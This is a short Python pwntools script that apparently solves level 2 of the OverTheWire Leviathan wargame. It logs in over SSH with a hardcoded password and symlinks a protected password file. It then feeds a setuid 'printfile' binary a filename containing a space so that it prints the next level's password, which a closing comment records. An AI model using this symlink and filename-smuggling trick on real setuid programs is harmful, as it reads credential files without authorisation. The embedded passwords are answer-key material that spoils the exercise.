from pwn import *
shell = ssh('leviathan2', 'leviathan.labs.overthewire.org',
        password='ougahZi8Ta')
sh = shell.run('bash')
log.info(sh.recv(timeout=5).decode())
#####################################
## download_file <printfile>
#shell.download_file('printfile')

sh.sendline('ln -sf /etc/leviathan_pass/leviathan3 /tmp/l2p')
log.info(sh.recv(timeout=20).decode())
sh.sendline('touch /tmp/l2p\ other')
log.info(sh.recv(timeout=20).decode())
sh.sendline('./printfile /tmp/l2p\ other')
log.info(sh.recv(timeout=30).decode())
log.info(sh.recv().decode())

#pass Ahdiemoo1j
